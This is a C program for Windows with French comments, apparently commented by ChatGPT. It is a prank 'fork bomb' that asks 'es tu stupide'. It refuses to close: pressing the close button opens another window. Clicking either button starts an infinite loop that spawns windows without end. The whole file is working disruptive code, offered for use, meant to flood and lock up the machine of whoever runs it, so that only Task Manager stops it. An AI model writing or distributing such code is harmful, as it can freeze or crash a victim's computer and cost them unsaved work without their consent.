/*
TITRE : fork bomb

créer par stupid et commenter par chatgpt car flemme d'expliquer mon code
ouvre une premiere fenêtre qui "ne peut pas se fermer"
(on peut par le gestionnaire de tache)
si on appui sur la croix la fenêtre ne se ferme pas et une autre s'ouvre
si on appui sur un bouton des fenêtres s'ouvre a l'infini
*/

#include <windows.h>  // Inclusion de l'en-tête nécessaire pour les API Windows

// Fonction de traitement des messages de la fenêtre (WindowProc)
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {  // Vérification du type de message envoyé à la fenêtre
        case WM_CREATE: {  // Message envoyé lors de la création de la fenêtre
            // Création d'un label (texte statique)
            CreateWindow("STATIC", "es tu stupide", WS_VISIBLE | WS_CHILD,
                         20, 20, 100, 20, hwnd, NULL, NULL, NULL);

            // Création du bouton "Oui"
            CreateWindow("BUTTON", "Oui", WS_VISIBLE | WS_CHILD,
                         20, 50, 80, 30, hwnd, (HMENU) 1, NULL, NULL);

            // Création du bouton "Non"
            CreateWindow("BUTTON", "Non", WS_VISIBLE | WS_CHILD,
                         120, 50, 80, 30, hwnd, (HMENU) 2, NULL, NULL);
            break;
        }
        case WM_COMMAND:  // Message envoyé lorsqu'un bouton est cliqué
            if (LOWORD(wParam) == 1 || LOWORD(wParam) == 2) {  // Si l'ID du bouton cliqué est "1" ou "2"
                while (1) {  // Boucle infinie qui crée des fenêtres persistantes
                    // Création d'une nouvelle fenêtre persistante
                    CreateWindow("WindowClass", "forkbomb", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                 CW_USEDEFAULT, CW_USEDEFAULT, 500, 500,
                                 NULL, NULL, GetModuleHandle(NULL), NULL);
                }
            }
            break;
        case WM_CLOSE:  // Message envoyé lorsque la fenêtre est fermée
            // Création d'une nouvelle fenêtre persistante lors de la fermeture de la fenêtre principale
            CreateWindow("WindowClass", "pourquoi essayer de partir?", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                         CW_USEDEFAULT, CW_USEDEFAULT, 500, 500,
                         NULL, NULL, GetModuleHandle(NULL), NULL);
            return 0;  // Ne ferme pas la fenêtre
        case WM_DESTROY:  // Message envoyé lorsque la fenêtre est détruite
            return 0;  // Retourne zéro pour indiquer que l'opération est terminée
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);  // Gestion des messages par défaut
}

// Fonction principale WinMain
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASS wc = {};  // Déclaration de la structure de classe de fenêtre
    wc.lpfnWndProc = WindowProc;  // Attribue la fonction de gestion des messages
    wc.hInstance = hInstance;  // Le handle de l'instance du programme
    wc.lpszClassName = "WindowClass";  // Nom de la classe de la fenêtre

    RegisterClass(&wc);  // Enregistre la classe de fenêtre

    // Création de la première fenêtre de l'application
    CreateWindow("WindowClass", "es tu stupide", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                 CW_USEDEFAULT, CW_USEDEFAULT, 500, 500,
                 NULL, NULL, hInstance, NULL);

    MSG msg = {};  // Déclaration de la structure de message
    while (GetMessage(&msg, NULL, 0, 0)) {  // Boucle principale pour traiter les messages de la fenêtre
        TranslateMessage(&msg);  // Traduire les messages de la fenêtre
        DispatchMessage(&msg);  // Envoyer le message au gestionnaire de messages
    }

    return 0;  // Retourne 0 pour indiquer que l'application s'est terminée
}
